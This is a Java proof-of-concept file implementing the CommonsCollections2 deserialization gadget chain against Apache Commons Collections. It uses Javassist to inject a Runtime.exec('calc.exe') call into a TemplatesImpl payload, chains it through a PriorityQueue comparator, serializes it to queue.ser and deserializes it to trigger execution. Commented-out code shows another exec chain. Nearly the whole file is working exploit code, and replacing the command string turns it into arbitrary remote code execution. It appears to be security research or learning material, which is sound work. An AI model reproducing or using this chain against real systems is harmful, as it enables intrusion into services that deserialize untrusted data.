package com.tophant;

import com.nqzero.permit.Permit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CommonsCollections2 {
    public static void main(String[] args) {
        try {
        String[] execArgs = new String[]{"calc.exe"};
        /*
             Transformer[] transfomers= new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},
                            new Object[]{"getRuntime",new Class[0]}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},
                            new Object[]{null,new Object[0]}),
                    new InvokerTransformer("exec",new Class[]{String.class},execArgs)
            };
             ChainedTransformer chainedTransformer = new ChainedTransformer(transfomers);
             chainedTransformer.transform("1");
            */

            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
            final CtClass ctClass = pool.get(StubTransletPayload.class.getName());
            String cmd  = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
            // 创建一个类代码块（static修饰的代码块），然后在该代码块后面插入要执行的代码
            ctClass.makeClassInitializer().insertAfter(cmd);
            CtClass superCtClass = pool.get(AbstractTranslet.class.getName());
            ctClass.setSuperclass(superCtClass);

            byte[] bytes = ctClass.toBytecode();
            Class templateClazz = TemplatesImpl.class;
            Field templateField = templateClazz.getDeclaredField("_bytecodes");
            Permit.setAccessible(templateField);

            Field nameField = templateClazz.getDeclaredField("_name");
            Permit.setAccessible(nameField);

            Field factoryField = templateClazz.getDeclaredField("_tfactory");
            Permit.setAccessible(factoryField);

            byte[] tempBytes = new byte[1024];
            Class fooClass = Foo.class;
            Class parentClass = fooClass.getEnclosingClass();
            String fullName = parentClass.getName().replace(".","/")+"$"+fooClass.getSimpleName()+".class";

            InputStream tempFileInputStream = CommonsCollections2.class.getClassLoader().getResourceAsStream(fullName);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int len =0;
            while((len = tempFileInputStream.read(tempBytes))!= -1) {
                out.write(tempBytes, 0, len);
            }

            Templates templatesInstance = (Templates) templateClazz.newInstance();
            templateField.set(templatesInstance,new byte[][]{
                    bytes,out.toByteArray()
            });
            nameField.set(templatesInstance,"Pwnr");
            factoryField.set(templatesInstance,new TransformerFactoryImpl());

            /*

            InvokerTransformer invokerTransformer = new InvokerTransformer("toString",new Class[0],new Object[0]);
            PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(chainedTransformer));
            queue.add(1);
            queue.add(2);
            Field queueField = PriorityQueue.class.getDeclaredField("queue");
            Permit.setAccessible(queueField);
            Object[] ququeArray = (Object[]) queueField.get(queue);
            ququeArray[0] = 1;
            ququeArray[1] = 1;

            */


            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesInstance})
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);



            InvokerTransformer invokerTransformer = new InvokerTransformer("toString",new Class[0],new Object[0]);

            PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(invokerTransformer));
            queue.add(1);
            queue.add(2);

            Field transformerField = InvokerTransformer.class.getDeclaredField("iMethodName");
            Permit.setAccessible(transformerField);
            transformerField.set(invokerTransformer,"newTransformer");

            Field queueField = PriorityQueue.class.getDeclaredField("queue");
            Permit.setAccessible(queueField);
            Object[] ququeArray = (Object[]) queueField.get(queue);
            ququeArray[0] = templatesInstance;
            ququeArray[1] = 1;
            FileOutputStream fileOutputStream = new FileOutputStream("queue.ser");
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
            objectOutputStream.writeObject(queue);

            FileInputStream fileInputStream = new FileInputStream("queue.ser");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            objectInputStream.readObject();

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (NotFoundException e) {
            e.printStackTrace();
        }

        /*
        } catch (ClassNotFoundException | CannotCompileException | NotFoundException | IOException | NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }

            */

    }

    public static class Foo implements Serializable{}
}

